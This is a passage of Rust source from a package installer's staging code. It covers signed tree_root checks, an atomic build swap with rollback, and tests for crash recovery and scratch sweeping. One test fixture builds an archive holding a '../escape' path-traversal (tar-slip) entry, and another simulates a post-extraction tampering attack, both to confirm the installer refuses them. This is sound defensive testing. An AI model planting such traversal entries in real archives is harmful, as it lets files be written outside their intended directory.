    aterm_types::dev_seam!(DISK_REVERIFY_ENV).is_some_and(|v| !v.is_empty())
}

/// The root step 3 compares against the signed value: the one the extractor folded, or,
/// when [`DISK_REVERIFY_ENV`] is armed, that root and a full on-disk
/// [`crate::tree::tree_root_declared`] walk over the declared `modes`, which must agree.
/// Disagreement is an error naming both, never a silent preference for one.
fn reverified_root(
    incoming: &Path,
    extracted_root: String,
    armed: bool,
    modes: &DeclaredModes,
) -> std::io::Result<String> {
    if !armed {
        return Ok(extracted_root);
    }
    let walked = tree_root_declared(incoming, modes)?;
    if !walked.eq_ignore_ascii_case(&extracted_root) {
        let mut msg = String::from("staged tree_root disagreement: the extraction folded ");
        msg.push_str(&extracted_root);
        msg.push_str(" but the on-disk walk read ");
        msg.push_str(&walked);
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, msg));
    }
    Ok(walked)
}

/// Move `incoming` onto `build_dir`, retiring whatever was there, in this order:
///
/// 1. `clear_build_ready`: until the caller's step 5 the build is not complete.
/// 2. `build_dir` → `<build>.superseded-<pid>` (skipped when nothing is installed).
/// 3. `incoming` → `build_dir`; if this fails the old tree is moved back.
/// 4. The superseded tree is reclaimed.
///
/// Both renames restore the marker on failure when the outgoing tree was complete: the
/// marker is the only thing that makes a tree visible to `list_installed`, so leaving a good
/// toolchain unmarked turns "the update did not happen" into "re-download gigabytes".
fn swap_into_place(build_dir: &Path, incoming: &Path) -> std::io::Result<()> {
    // Whether the tree we replace was complete decides what a rollback may claim: re-marking
    // a tree that never was would promote a crash leftover to "installed".
    let was_complete = crate::store::build_is_complete(build_dir);
    crate::store::clear_build_ready(build_dir)?;
    if let Some(parent) = build_dir.parent() {
        // Ordered: the marker is down (and the staged tree, flushed before, ahead of
        // it) before the old tree moves aside; an unmarked tree reads as incomplete and
        // is staged again.
        crate::store::sync_dir_ordered(parent);
    }
    let superseded = crate::store::superseded_dir(build_dir);
    let retired = match superseded {
        Some(ref old) if build_dir.exists() => {
            let _ = crate::store::remove_tree(old);
            if let Err(e) = std::fs::rename(build_dir, old) {
                // The swap could not begin: a failed rename moved nothing, so the old tree
                // is still at `build_dir`, as complete as it was, and re-marking asserts
                // nothing new.
                if was_complete {
                    let _ = crate::store::mark_build_ready(build_dir);
                }
                return Err(e);
            }
            true
        }
        _ => false,
    };
    if let Err(e) = std::fs::rename(incoming, build_dir) {
        // Put the old build back before reporting: the difference between "the update did
        // not happen" and "the toolchain is gone".
        if retired && let Some(ref old) = superseded {
            restore_outgoing(old, build_dir, was_complete);
        }
        return Err(e);
    }
    if retired && let Some(ref old) = superseded {
        let _ = crate::store::remove_tree(old);
    }
    Ok(())
}

/// Move the parked outgoing tree back to `build_dir` and, only if it was complete before the
/// swap, re-mark it. `true` when the tree really came back.
///
/// Both guards are needed: [`crate::store::mark_build_ready`] never looks at `<build>`, so
/// re-marking after a failed restore would write a durable completeness marker for a tree
/// that is not there.
fn restore_outgoing(old: &Path, build_dir: &Path, was_complete: bool) -> bool {
    if std::fs::rename(old, build_dir).is_err() {
        return false;
    }
    if was_complete {
        let _ = crate::store::mark_build_ready(build_dir);
    }
    true
}

#[cfg(any(test, all(debug_assertions, target_os = "macos")))]
#[path = "install_acceptance.rs"]
mod acceptance_fixtures;

#[cfg(all(debug_assertions, target_os = "macos"))]
pub use acceptance_fixtures::{
    a_real_image_stages_its_single_app, a_real_image_with_no_app_is_refused_and_detached,
};

#[cfg(test)]
mod tests {
    use super::acceptance_fixtures::*;
    use super::*;
    use crate::manifest::Artifact;
    use crate::tree::file_sha256;
    use std::path::PathBuf;

    fn tmp(label: &str) -> crate::testdir::Dir {
        crate::testdir::dir(&format!("atpkg-install-{label}-"))
    }

    /// One raw USTAR header + padded body for a regular file.
    fn tar_entry(name: &str, content: &[u8]) -> Vec<u8> {
        let mut h = [0u8; 512];
        let nb = name.as_bytes();
        h[..nb.len()].copy_from_slice(nb);
        h[100..108].copy_from_slice(b"0000644\0");
        h[108..116].copy_from_slice(b"0000000\0");
        h[116..124].copy_from_slice(b"0000000\0");
        h[124..136].copy_from_slice(format!("{:011o}\0", content.len()).as_bytes());
        h[136..148].copy_from_slice(b"00000000000\0");
        h[148..156].copy_from_slice(b"        ");
        h[156] = b'0';
        h[257..263].copy_from_slice(b"ustar\0");
        h[263..265].copy_from_slice(b"00");
        let sum: u32 = h.iter().map(|&b| u32::from(b)).sum();
        h[148..156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());

        let mut out = h.to_vec();
        out.extend_from_slice(content);
        out.resize(out.len() + (512 - content.len() % 512) % 512, 0);
        out
    }

    /// Write a raw tar stream (plus its two zero end-of-archive blocks) to `path` as one
    /// zstd frame.
    fn seal(path: PathBuf, mut tar: Vec<u8>) -> PathBuf {
        tar.resize(tar.len() + 1024, 0);
        std::fs::write(&path, crate::extract::fixtures::zstd_bytes(&tar)).unwrap();
        path
    }

    /// A minimal raw USTAR + zstd archive with one regular file `bin/ay`.
    fn make_archive(dir: &Path) -> PathBuf {
        seal(
            dir.join("ay-18.tar.zst"),
            tar_entry("bin/ay", b"#!/bin/true\nthe ay binary"),
        )
    }

    /// An archive whose extraction fails part-way: a good first entry (real bytes land in
    /// the staging tree), then a `../escape` entry [`crate::extract::vet_entry`] refuses.
    ///
    /// The caller signs its sha256, so the download gate passes and the failure lands in
    /// step 2.
    fn make_slip_archive(dir: &Path) -> PathBuf {
        let mut tar = tar_entry("bin/ay", b"a plausible first entry");
        tar.extend(tar_entry("../escape", b"pwned"));
        seal(dir.join("slip-18.tar.zst"), tar)
    }

    /// A scratch root, a good archive, and the artifact whose sha256 and tree_root describe
    /// it, learned through the extractor, never from `verify_and_stage` (a fixture fed by
    /// the function under test is satisfied by one that checks nothing).
    struct Bundle {
        dir: crate::testdir::Dir,
        archive: PathBuf,
        art: Artifact,
    }

    fn bundle(label: &str) -> Bundle {
        let dir = tmp(label);
        let archive = make_archive(&dir);
        let sha = file_sha256(&archive).unwrap();
        let probe = dir.join("probe");
        // A live differential: the expected root comes from walking the extracted tree on
        // disk, while `verify_and_stage` compares against the root the extractor folds, so
        // every staging test fails if the two producers disagree over this bundle. The walk
        // gets the fold's declared modes, which only a filesystem without permission bits
        // (Windows) consults.
        let modes = crate::extract::extract_tar_zst_tree(
            &archive,
            &probe,
            1 << 20,
            1000,
            ExtractOptions::default(),
            FrameChecksum::IfPresent,
        )
        .unwrap()
        .declared_modes();
        let root = tree_root_declared(&probe, &modes).unwrap();
        std::fs::remove_dir_all(&probe).unwrap();
        assert_eq!(root.len(), 64, "the fixture must carry a real tree_root");
        Bundle {
            dir,
            archive,
            art: artifact(&sha, &root),
        }
    }

    impl Bundle {
        /// `store/ay/18` under this bundle's scratch root.
        fn build(&self) -> PathBuf {
            self.dir.join("store/ay/18")
        }

        /// Install build 18 through the real stage and leave a witness file inside it, so
        /// "the old build survived" means this tree, not a replacement with the same files.
        /// Returns `(build_dir, witness)`.
        fn installed(&self) -> (PathBuf, PathBuf) {
            let build = self.build();
            verify_and_stage(&self.art, &self.archive, &build, &StageHooks::NONE).unwrap();
            assert!(
                crate::store::build_is_complete(&build),
                "the fixture is only interesting once the build is really installed"
            );
            let witness = build.join("this-tree-survived");
            std::fs::write(&witness, b"old").unwrap();
            (build, witness)
        }
    }

    /// What a refused stage must be: the error it names.
    type Want = fn(&StageError) -> bool;

    /// THE GOVERNING INVARIANT: a stage refused at any step before the swap — the digest,
    /// the extraction (a tar-slip after a good first entry, so real bytes were written),
    /// the tree_root re-verify, an unknown lane, the caller's gate, a sidecar that does not
    /// render or that the store would never reclaim — leaves no build and no scratch at a
    /// fresh path and, over an installed build, THAT build in place and still complete: a
    /// stage that cannot install the new build must not have uninstalled the old one. The
    /// gate is never shown bytes that failed verification.
    #[test]
    fn a_stage_refused_before_the_swap_leaves_the_installed_build_intact() {
        type Sidecars = Result<Vec<(&'static str, Vec<u8>)>, StageError>;
        let b = bundle("refused");
        let slip = make_slip_archive(&b.dir);
        let slip_art = artifact(&file_sha256(&slip).unwrap(), "");
        let bad_digest = artifact("deadbeef", "");
        let bad_root = artifact(&b.art.sha256, &"a".repeat(64));
        let mut unknown_lane = b.art.clone();
        unknown_lane.protocol = "https".into();
        unknown_lane.payload = "pkg".into();
        let gated = std::cell::Cell::new(false);
        let watch = |_: &Path| -> Result<(), StageError> {
            gated.set(true);
            Ok(())
        };
        let refuse = |_: &Path| -> Result<(), StageError> {
            Err(StageError::SignerRefused("bin/ay".into()))
        };
        let unrenderable = |_: &str| -> Sidecars { Err(StageError::Payload("x".into())) };
        let bogus_suffix = |_: &str| -> Sidecars { Ok(vec![(".bogus", b"x".to_vec())]) };
        let watched = StageHooks {
            pre_swap: Some(&watch),
            sidecars: None,
            aliases: &[],
        };
        let gate = StageHooks {
            pre_swap: Some(&refuse),
            sidecars: None,
            aliases: &[],
        };
        let render = StageHooks {
            pre_swap: None,
            sidecars: Some(&unrenderable),
            aliases: &[],
        };
        let suffix = StageHooks {
            pre_swap: None,
            sidecars: Some(&bogus_suffix),
            aliases: &[],
        };
        let cases: [(&str, &Artifact, &Path, &StageHooks<'_>, Want); 7] = [
            ("digest", &bad_digest, &b.archive, &watched, |e| {
                matches!(
                    e,
                    StageError::DigestMismatch {
                        alg: DigestAlg::Sha256,
                        ..
                    }
                )
            }),
            ("slip", &slip_art, &slip, &watched, |e| {
                matches!(e, StageError::Extract(_))
            }),
            ("tree_root", &bad_root, &b.archive, &watched, |e| {
                matches!(e, StageError::TreeRootMismatch { .. })
            }),
            ("unknown lane", &unknown_lane, &b.archive, &watched, |e| {
                matches!(e, StageError::Payload(_))
            }),
            ("gate", &b.art, &b.archive, &gate, |e| {
                matches!(e, StageError::SignerRefused(_))
            }),
            ("sidecar render", &b.art, &b.archive, &render, |e| {
                matches!(e, StageError::Payload(_))
            }),
            ("sidecar suffix", &b.art, &b.archive, &suffix, |e| {
                matches!(e, StageError::Payload(_))
            }),
        ];
        let (build, witness) = b.installed();
        let fresh = b.dir.join("store/ay/19");
        for (label, art, archive, hooks, want) in cases {
            for target in [&fresh, &build] {
                let err = verify_and_stage(art, archive, target, hooks).unwrap_err();
                assert!(want(&err), "{label}: {err:?}");
                assert!(scratch_beside(target).is_empty(), "{label}: scratch left");
            }
            assert!(
                !fresh.exists(),
                "{label}: a refused fresh stage left a build"
            );
            assert_eq!(
                std::fs::read(&witness).unwrap(),
                b"old",
                "{label}: the installed tree was replaced"
            );
            assert!(
                crate::store::build_is_complete(&build),
                "{label}: the installed build lost its marker"
            );
        }
        assert!(!gated.get(), "the gate saw bytes that failed verification");
        assert!(
            !build.parent().unwrap().join("escape").exists(),
            "the slip escaped the stage"
        );
    }

    /// The extraction cap is twice the signed size, never under 1 MiB, and 2 GiB for a row
    /// that signs no size.
    #[test]
    fn the_extraction_cap_follows_the_signed_size() {
        let cap = |disk_installed| {
            let mut a = artifact("", "");
            a.cost.disk_installed = disk_installed;
            size_cap(&a)
        };
        assert_eq!(cap(0), 2 << 30);
        assert_eq!(cap(1), 1 << 20);
        assert_eq!(cap(1 << 20), 2 << 20);
        assert_eq!(cap(u64::MAX), u64::MAX);
    }

    /// A row that signs a sha512 is gated by it: the matching archive stages, and a differing
    /// sha512 is refused naming that algorithm, even when it carries the archive's sha256. A
    /// row that signs both digests or neither is refused before extraction too.
    #[test]
    fn a_sha512_row_is_gated_by_its_sha512() {
        let b = bundle("sha512");
        let sha512 = crate::tree::file_sha512(&b.archive).unwrap();
        let by_512 = |sha256: &str, sha512: &str| Artifact {
            sha256: sha256.into(),
            sha512: sha512.into(),
            ..b.art.clone()
        };
        let build = b.build();
        // Signed hex is compared case-insensitively, the digest and the root alike.
        let upper = Artifact {
            tree_root: b.art.tree_root.to_ascii_uppercase(),
            ..by_512("", &sha512.to_ascii_uppercase())
        };
        verify_and_stage(&upper, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
        let other = b.dir.join("store/ay/19");
        let err = verify_and_stage(
            &by_512("", &b.art.sha256),
            &b.archive,
            &other,
            &StageHooks::NONE,
        )
        .unwrap_err();
        assert!(
            matches!(&err, StageError::DigestMismatch { alg: DigestAlg::Sha512, got, .. } if *got == sha512),
            "{err:?}"
        );
        for (sha256, sha512) in [(b.art.sha256.as_str(), sha512.as_str()), ("", "")] {
            let err = verify_and_stage(
                &by_512(sha256, sha512),
                &b.archive,
                &other,
                &StageHooks::NONE,
            )
            .unwrap_err();
            assert!(
                matches!(&err, StageError::DigestMismatch { expected, .. } if expected.is_empty()),
                "{err:?}"
            );
        }
        assert!(!other.exists(), "nothing staged past a refused digest");
    }

    /// A row that signs no `tree_root` must carry the zstd frame's content checksum, over the
    /// release-bundle lane and the `tar-zst` vendor lane: the bundle's tar in a frame without
    /// one is refused in extraction and nothing is staged; signing its root admits that same
    /// frame (the root is the check there), and the checksummed frame stages with no root.
    #[test]
    fn an_unsigned_tree_root_requires_the_frame_checksum() {
        let dir = tmp("frame-checksum");
        let mut tar = tar_entry("bin/ay", b"#!/bin/true\nthe ay binary");
        tar.resize(tar.len() + 1024, 0);
        let bare = dir.join("bare.tar.zst");
        let mut zst = Vec::new();
        aterm_zstd::frame::write_raw(&mut zst, &tar, aterm_zstd::frame::Checksum::Omitted).unwrap();
        std::fs::write(&bare, zst).unwrap();
        let checked = make_archive(&dir);
        // The bare frame's root, learned by extracting it once (never from the stage).
        let probe = dir.join("probe");
        let modes = crate::extract::extract_tar_zst_tree(
            &bare,
            &probe,
            1 << 20,
            1000,
            ExtractOptions::default(),
            FrameChecksum::IfPresent,
        )
        .unwrap()
        .declared_modes();
        let root = tree_root_declared(&probe, &modes).unwrap();
        std::fs::remove_dir_all(&probe).unwrap();

        for payload in ["", "tar-zst"] {
            let row = |archive: &Path, root: &str| {
                let mut a = vendor_artifact(archive, payload, root);
                if payload.is_empty() {
                    a.protocol = "github-release".into();
                }
                a
            };
            let build = dir.join(format!("store/ay-{payload}/18"));
            let err =
                verify_and_stage(&row(&bare, ""), &bare, &build, &StageHooks::NONE).unwrap_err();
            assert!(
                matches!(err, StageError::Extract(_))
                    && err.to_string().contains("no content checksum"),
                "{payload:?}: got {err:?}"
            );
            assert!(!build.exists(), "{payload:?}: nothing is staged");
            assert!(scratch_beside(&build).is_empty(), "{payload:?}: no scratch");

            verify_and_stage(&row(&bare, &root), &bare, &build, &StageHooks::NONE)
                .unwrap_or_else(|e| panic!("{payload:?}, root signed: {e}"));
            let unsigned = dir.join(format!("store/ay-{payload}/19"));
            verify_and_stage(&row(&checked, ""), &checked, &unsigned, &StageHooks::NONE)
                .unwrap_or_else(|e| panic!("{payload:?}, checksummed: {e}"));
            for b in [&build, &unsigned] {
                assert_eq!(
                    std::fs::read(b.join("bin/ay")).unwrap(),
                    b"#!/bin/true\nthe ay binary",
                    "{payload:?}"
                );
            }
        }
    }

    /// Scratch a killed earlier run left is swept by the next stage of that build: every
    /// mutating verb holds the store lock, so its owner cannot come back.
    #[test]
    fn a_new_stage_sweeps_scratch_left_by_a_killed_run() {
        let b = bundle("sweep");
        let build = b.build();
        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
        // A half-extracted tree from a run that never finished.
        let orphan = build.with_file_name("18.incoming-999999");
        std::fs::create_dir_all(orphan.join("bin")).unwrap();
        std::fs::write(orphan.join("bin/half"), b"partial").unwrap();
        assert!(orphan.exists(), "the fixture starts with debris on disk");

        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(!orphan.exists(), "the orphaned scratch was not swept");
        assert!(crate::store::build_is_complete(&build));
        assert!(scratch_beside(&build).is_empty());
    }

    /// A SWAP THAT CANNOT EVEN BEGIN MUST PUT THE MARKER BACK.
    ///
    /// `swap_into_place` takes the completeness marker down first, because for the duration
    /// of the swap the build honestly is not complete. If the very first rename then fails,
    /// the old tree has not moved an inch — but without restoring the marker it now reads as
    /// "not installed" to `list_installed`, `decide` and every reclaim path, so a working
    /// toolchain gets re-downloaded and re-extracted for nothing.
    ///
    /// The failure is induced the only way that is portable and needs no hook: a regular FILE
    /// occupies the `<build>.superseded-<pid>` path, and renaming a directory onto a
    /// non-directory fails.
    ///
    /// Driven through `swap_into_place` rather than `verify_and_stage`, because the stage's
    /// own `sweep_stage_scratch` RECLAIMS a stray non-directory at a scratch path and so
    /// clears this blocker before the swap ever sees it — asserted separately by
    /// `a_refused_recovery_keeps_every_parked_tree_and_sweeps_the_rest`; the guarantee under test
    /// here is what `swap_into_place` does when its first rename fails, whatever the cause.
    #[test]
    fn a_swap_that_cannot_begin_restores_the_marker_it_took_down() {
        let b = bundle("swap-blocked");
        let (build, witness) = b.installed();

        let blocker = crate::store::superseded_dir(&build).unwrap();
        std::fs::write(&blocker, b"not a directory").unwrap();
        let incoming = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(incoming.join("bin")).unwrap();
        // Windows renames a directory over a file, and refuses to rename one while a file
        // in it is open: there the witness, held open across the swap, is the blocker.
        #[cfg(windows)]
        let held = std::fs::File::open(&witness).unwrap();

        let err = swap_into_place(&build, &incoming).unwrap_err();
        #[cfg(windows)]
        drop(held);
        assert!(
            blocker.is_file(),
            "the fixture only exercises the failed-retire path while the blocker is there"
        );
        let refused = if cfg!(windows) {
            std::io::ErrorKind::PermissionDenied
        } else {
            std::io::ErrorKind::NotADirectory
        };
        assert_eq!(
            err.kind(),
            refused,
            "the fixture must fail at the FIRST rename, not somewhere else"
        );
        assert!(
            witness.exists(),
            "the old tree never moved and must still be here"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "a swap that could not begin must leave the build as complete as it found it"
        );
    }

    /// The rollback: when the second rename fails, the old tree parked at
    /// `<build>.superseded-<pid>` comes back, complete. An absent `incoming` is the one way
    /// to fail only the second rename in-process (both renames share a directory).
    #[test]
    fn a_failed_final_rename_rolls_the_old_build_back_and_re_marks_it() {
        let b = bundle("rollback-complete");
        let (build, witness) = b.installed();

        let incoming = crate::store::incoming_dir(&build).unwrap();
        assert!(
            !incoming.exists(),
            "the fixture depends on the incoming tree being absent"
        );

        let err = swap_into_place(&build, &incoming).unwrap_err();
        assert_eq!(
            err.kind(),
            std::io::ErrorKind::NotFound,
            "the fixture must fail at the rename, not somewhere else"
        );
        assert!(
            witness.exists() && std::fs::read(&witness).unwrap() == b"old",
            "the old build must be back at its own path, not stranded in .superseded-"
        );
        assert!(
            crate::store::build_is_complete(&build),
            "it was complete before the swap, so it must be complete after the rollback"
        );
        assert!(
            scratch_beside(&build).is_empty(),
            "the rollback must not leave the superseded tree behind: {:?}",
            scratch_beside(&build)
        );
    }

    /// A rollback restores the tree unconditionally but re-marks it only if it was complete
    /// before, so a crash leftover is never promoted to installed.
    #[test]
    fn a_rollback_never_promotes_a_tree_that_was_never_complete() {
        let b = bundle("rollback-incomplete");
        let (build, witness) = b.installed();
        // What a crash between extract and mark leaves: a populated tree, no marker.
        crate::store::clear_build_ready(&build).unwrap();
        assert!(
            !crate::store::build_is_complete(&build),
            "the fixture is only interesting while the tree is marker-less"
        );

        let incoming = crate::store::incoming_dir(&build).unwrap();
        assert!(!incoming.exists());
        let err = swap_into_place(&build, &incoming).unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::NotFound);

        assert!(witness.exists(), "the tree still comes back");
        assert!(
            !crate::store::build_is_complete(&build),
            "a rollback must never mark a build that was not complete before it"
        );
        assert!(scratch_beside(&build).is_empty());
    }

    /// The marker is written last, as a sibling, so it is never part of the signed tree: the
    /// staged tree still hashes to the signed value and the marker lives outside `build_dir`.
    #[test]
    fn the_marker_is_written_last_and_is_never_part_of_the_hashed_tree() {
        let b = bundle("marker-last");
        let build = b.build();
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();

        assert!(crate::store::build_is_complete(&build));
        // The walk `atpkg verify` runs, over the declared-mode record beside the build.
        let modes = crate::store::declared_modes(&build).unwrap();
        assert_eq!(
            tree_root_declared(&build, &modes).unwrap(),
            b.art.tree_root,
            "the marker must not have moved the tree_root — it is not inside the tree"
        );
        let marker = build.with_file_name("18.ready");
        assert!(marker.is_file(), "the marker is the SIBLING <build>.ready");
    }

    /// Block `mark_build_ready`'s temp write with a non-empty directory at the exact
    /// `<parent>/.ready.tmp-<pid>` path it writes to. Nothing earlier in the chain touches
    /// that name, so the failure lands at step 5.
    fn block_the_marker_write(build_dir: &Path) -> PathBuf {
        let parent = build_dir.parent().unwrap();
        std::fs::create_dir_all(parent).unwrap();
        let blocker = parent.join(format!(".ready.tmp-{}", std::process::id()));
        std::fs::create_dir_all(&blocker).unwrap();
        std::fs::write(blocker.join("occupied"), b"x").unwrap();
        blocker
    }

    // The invariant at its last step: when the marker write fails after the swap, the
    // verified tree stays, unmarked (see `verify_and_stage` step 5).
    #[test]
    fn a_marker_write_that_fails_after_the_swap_keeps_the_verified_tree() {
        let b = bundle("marker-fail-keeps-tree");
        let (build, witness) = b.installed();
        let blocker = block_the_marker_write(&build);
        assert!(
            crate::store::build_is_complete(&build),
            "PRECONDITION: build 18 is installed and complete before the re-stage"
        );

        let err = verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(
            matches!(err, StageError::Io(_)),
            "the marker write is what failed: {err:?}"
        );

        // The stage could not finish installing the new build, yet the tree is still there.
        assert!(
            build.is_dir(),
            "a failed marker write destroyed a fully verified, correctly swapped-in tree"
        );
        assert!(
            !witness.exists(),
            "the swap installs the NEW tree, never merging into the old one"
        );
        assert_eq!(
            std::fs::read(build.join("bin/ay")).unwrap(),
            b"#!/bin/true\nthe ay binary",
            "and the tree left behind is the VERIFIED one, not a partial"
        );
        // Unmarked, so it reads as not installed and the next run re-stages it.
        assert!(
            !crate::store::build_is_complete(&build),
            "a build that could not be marked must never read as complete"
        );

        // Non-vacuity: with the blocker cleared the same call marks it ready.
        std::fs::remove_dir_all(&blocker).unwrap();
        verify_and_stage(&b.art, &b.archive, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
    }

    // The two-rename crash window: a SIGKILL between `rename(build, superseded)` and
    // `rename(incoming, build)` leaves the only copy of the old tree parked, and the sweep
    // moves it back rather than deleting it as scratch.
    #[test]
    fn a_crash_between_the_two_renames_recovers_the_old_tree_instead_of_deleting_it() {
        let b = bundle("crash-window-recover");
        let (build, witness) = b.installed();
        // The killed-mid-swap state: marker down, tree parked, nothing at the build path.
        let superseded = crate::store::superseded_dir(&build).unwrap();
        crate::store::clear_build_ready(&build).unwrap();
        std::fs::rename(&build, &superseded).unwrap();
        assert!(
            !build.exists() && superseded.is_dir(),
            "PRECONDITION: mid-swap"
        );

        crate::store::sweep_stage_scratch(&build);

        assert!(
            build.is_dir(),
            "the only copy of the old tree was deleted as scratch — nothing is left"
        );
        assert!(
            build.join(witness.file_name().unwrap()).exists(),
            "and it is THAT tree, not a lookalike"
        );
        // Not re-marked: the swap cleared the marker before the rename, so completeness is
        // unrecoverable from disk, and the next run re-stages it.
        assert!(
            !crate::store::build_is_complete(&build),
            "recovery must never claim a completeness it cannot prove"
        );
        assert!(!superseded.exists(), "and the scratch name is released");
    }

    // A recovery that did not happen must not fall through into the delete. With `<build>`
    // absent and two superseded siblings beside it, `recover_interrupted_swap` cannot tell
    // which tree is the outgoing one and refuses to move either; while nothing stands at
    // `<build>`, a parked TREE is the only copy of that build there is, and the sweep keeps
    // both. It still takes what is nobody's only copy: an incoming half-extract, and a
    // regular file at a superseded name, which neither sweeper could otherwise reclaim
    // (`remove_dir_all` fails on a file, `gc` scans directories only) and which blocks
    // every later swap of this build from a process holding that pid.
    #[test]
    fn a_refused_recovery_keeps_every_parked_tree_and_sweeps_the_rest() {
        let b = bundle("crash-window-refused");
        let (build, witness) = b.installed();
        let parked = crate::store::superseded_dir(&build).unwrap();
        crate::store::clear_build_ready(&build).unwrap();
        std::fs::rename(&build, &parked).unwrap();
        let sibling = |suffix: &str| build.with_file_name(format!("18.{suffix}"));
        let other = sibling("superseded-4242");
        std::fs::create_dir_all(&other).unwrap();
        let stray = sibling("superseded-9999");
        std::fs::write(&stray, b"not a tree").unwrap();
        let incoming = crate::store::incoming_dir(&build).unwrap();
        std::fs::create_dir_all(&incoming).unwrap();

        crate::store::sweep_stage_scratch(&build);

        assert!(
            parked.join(witness.file_name().unwrap()).exists() && other.is_dir(),
            "a sweep the refused recovery called off took a parked tree"
        );
        assert!(!stray.exists(), "a file at a scratch name leaks forever");
        assert!(
            !incoming.exists(),
            "an unverified half-extract is still swept"
        );
    }

    // Beside a LIVE build the sweep takes the producer's exact scratch shapes — an
    // incoming half-extract, and a superseded tree a killed run left past its second
    // rename (else a whole tree leaks forever) — and leaves the build and its marker alone.
    // It spares a lookalike (`18.incoming-drafts`) exactly as `gc::is_stage_scratch` does:
    // an unguarded `remove_dir_all` in a directory the user can also put things in only
    // fires on the producer's exact shape.
    #[test]
    fn the_sweep_beside_a_live_build_takes_only_the_producers_scratch() {
        let b = bundle("sweep-shape");
        let (build, _) = b.installed();
        let user_dir = build.with_file_name("18.incoming-drafts");
        std::fs::create_dir_all(&user_dir).unwrap();
        std::fs::write(user_dir.join("notes.md"), b"mine").unwrap();
        let incoming = crate::store::incoming_dir(&build).unwrap();
        let superseded = crate::store::superseded_dir(&build).unwrap();
        for scratch in [&incoming, &superseded] {
            std::fs::create_dir_all(scratch.join("bin")).unwrap();
        }

        crate::store::sweep_stage_scratch(&build);

        assert!(
            !incoming.exists() && !superseded.exists(),
            "scratch was left"
        );
        assert!(
            user_dir.join("notes.md").exists(),
            "a lookalike is not ours"
        );
        assert!(crate::store::build_is_complete(&build));
    }

    // A rollback re-marks only a tree it put back: `mark_build_ready` never looks at `<n>`.
    // Driven through `restore_outgoing` directly, since on a real filesystem anything that
    // blocks the restoring rename blocks the first rename too.
    #[test]
    fn a_rollback_that_cannot_restore_the_tree_writes_no_marker() {
        let b = bundle("rollback-restore-fails");
        let build = b.build();
        std::fs::create_dir_all(build.parent().unwrap()).unwrap();
        let vanished = crate::store::superseded_dir(&build).unwrap();
        assert!(
            !vanished.exists(),
            "PRECONDITION: the tree to restore is not there, so the rename must fail"
        );

        assert!(
            !restore_outgoing(&vanished, &build, true),
            "a failed restore must report itself as failed"
        );
        assert!(
            !crate::store::build_is_complete(&build),
            "a rollback that could not restore the tree must not claim it is complete"
        );
    }

    /// A tree mutated AFTER extraction is still refused when the walk is armed — the
    /// window the fused digest gives up is exactly this one, so the escape hatch has to
    /// actually close it — while the same tree untouched passes.
    #[test]
    fn the_armed_walk_still_catches_a_post_extraction_mutation() {
        let b = bundle("armed-mutation");
        let probe = b.dir.join("mut-probe");
        let tree = crate::extract::extract_tar_zst_tree(
            &b.archive,
            &probe,
            1 << 20,
            1000,
            ExtractOptions::default(),
            FrameChecksum::IfPresent,
        )
        .unwrap();
        let modes = tree.declared_modes();
        let fused = tree.root();
        // Non-vacuity: armed, the untouched tree passes with its own root.
        assert_eq!(
            reverified_root(&probe, fused.clone(), true, &modes).unwrap(),
            fused
        );
        // Mutate the extracted file in place, exactly as a TOCTOU attacker would.
        std::fs::write(probe.join("bin/ay"), b"swapped after extraction").unwrap();
        assert!(
            reverified_root(&probe, fused, true, &modes).is_err(),
            "an armed re-verify must refuse a tree mutated after the write"
        );
    }

    // ===== the https payload lanes =====

    #[cfg(unix)]
    use crate::extract::fixtures::{ZipMember, gzip_bytes, tar_bytes, zip_bytes};

    /// The `gh` archive shape as tar bytes: a versioned top-level directory to strip, an
    /// executable, a plain file, a nested one, a hardlink alias and an in-root symlink.
    #[cfg(unix)]
    fn gh_tar() -> Vec<u8> {
        const TOP: &str = "gh_2.80.0_macOS_arm64";
        let at = |rel: &str| format!("{TOP}/{rel}");
        let (gh, alias, license, man, link) = (
            at("bin/gh"),
            at("bin/gh-alias"),
            at("LICENSE"),
            at("share/man/man1/gh.1"),
            at("bin/gh-link"),
        );
        tar_bytes(&[
            (&at(""), b'5', "", b"", 0o755),
            (&gh, b'0', "", GH, 0o755),
            (&license, b'0', "", b"MIT", 0o644),
            (&man, b'0', "", b".TH gh 1", 0o644),
            (&alias, b'1', &gh, b"", 0o755),
            (&link, b'2', "../share/man/man1/gh.1", b"", 0o777),
        ])
    }

    /// The `gh` executable's bytes.
    #[cfg(unix)]
    const GH: &[u8] = b"#!/bin/sh\necho gh\n";

    /// …and the same shape as a zip, which has no hardlinks: the alias is a second
    /// regular file of the same bytes, which the walk (and the fold) digest identically.
    #[cfg(unix)]
    fn gh_zip() -> Vec<u8> {
        let member = |name, mode, data| ZipMember {
            name,
            mode,
            data,
            deflate: true,
        };
        zip_bytes(
            &[
                member("gh_2.80.0_macOS_arm64/", 0o040_755, b""),
                member("gh_2.80.0_macOS_arm64/bin/gh", 0o100_755, GH),
                member("gh_2.80.0_macOS_arm64/LICENSE", 0o100_644, b"MIT"),
                member(
                    "gh_2.80.0_macOS_arm64/share/man/man1/gh.1",
                    0o100_644,
                    b".TH gh 1",
                ),
                member("gh_2.80.0_macOS_arm64/bin/gh-alias", 0o100_755, GH),
                member(
                    "gh_2.80.0_macOS_arm64/bin/gh-link",
                    0o120_777,
                    b"../share/man/man1/gh.1",
                ),
            ],
            false,
        )
    }

    /// The tree the `gh` shape must stage to, learned from a hand-laid replica.
    #[cfg(unix)]
    fn gh_expected_root(dir: &Path) -> String {
        let replica = dir.join("replica");
        lay(&replica, "bin/gh", GH, 0o755);
        lay(&replica, "bin/gh-alias", GH, 0o755);
        lay(&replica, "LICENSE", b"MIT", 0o644);
        lay(&replica, "share/man/man1/gh.1", b".TH gh 1", 0o644);
        lay_link(&replica, "bin/gh-link", "../share/man/man1/gh.1");
        tree_root(&replica).unwrap()
    }

